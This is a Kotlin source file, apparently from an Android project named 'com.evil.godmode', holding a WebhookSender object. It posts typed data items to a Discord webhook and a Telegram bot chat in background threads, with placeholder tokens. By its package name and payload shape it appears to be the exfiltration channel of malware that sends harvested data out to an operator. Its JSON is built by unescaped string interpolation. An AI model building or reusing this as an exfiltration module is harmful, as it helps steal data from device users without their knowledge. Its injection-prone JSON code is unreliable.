package com.evil.godmode

import android.os.Handler
import android.os.Looper
import java.io.BufferedReader
import java.io.DataOutputStream
import java.io.InputStreamReader
import java.net.HttpURLConnection
import java.net.URL

object WebhookSender {

    // Use these constants for your specific service
    private const val DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/YOUR_ID/YOUR_TOKEN"
    private const val TELEGRAM_BOT_TOKEN = "YOUR_BOT_TOKEN"
    private const val TELEGRAM_CHAT_ID = "YOUR_CHAT_ID"

    fun sendDiscord(data: Map<String, String>) {
        Thread {
            try {
                val url = URL(DISCORD_WEBHOOK_URL)
                val connection = url.openConnection() as HttpURLConnection
                connection.doInput = true
                connection.doOutput = true
                connection.setRequestMethod("POST")
                connection.setRequestProperty("Content-Type", "application/json; charset=UTF-8")
                
                // Create a simple embed for Discord
                val jsonPayload = """{"content":"${data["type"]}: ${data["data"]}"}"""
                val outputStream = DataOutputStream(connection.outputStream)
                outputStream.writeBytes(jsonPayload)
                outputStream.flush()
                outputStream.close()
                
                val responseCode = connection.responseCode
                if (responseCode == HttpURLConnection.HTTP_OK) {
                    println("Discord sent successfully")
                } else {
                    println("Discord failed with code $responseCode")
                }
            } catch (e: Exception) {
                e.printStackTrace()
            }
        }.start()
    }

    fun sendTelegram(text: String) {
        Thread {
            try {
                val url = URL("https://api.telegram.org/bot$TELEGRAM_BOT_TOKEN/sendMessage")
                val connection = url.openConnection() as HttpURLConnection
                connection.doInput = true
                connection.doOutput = true
                connection.setRequestMethod("POST")
                connection.setRequestProperty("Content-Type", "application/json; charset=UTF-8")
                
                val jsonPayload = """{"chat_id": "$TELEGRAM_CHAT_ID", "text": "$text"}"""
                val outputStream = DataOutputStream(connection.outputStream)
                outputStream.writeBytes(jsonPayload)
                outputStream.flush()
                outputStream.close()
                
                val responseCode = connection.responseCode
                if (responseCode == HttpURLConnection.HTTP_OK) {
                    println("Telegram sent successfully")
                } else {
                    println("Telegram failed with code $responseCode")
                }
            } catch (e: Exception) {
                e.printStackTrace()
            }
        }.start()
    }
}
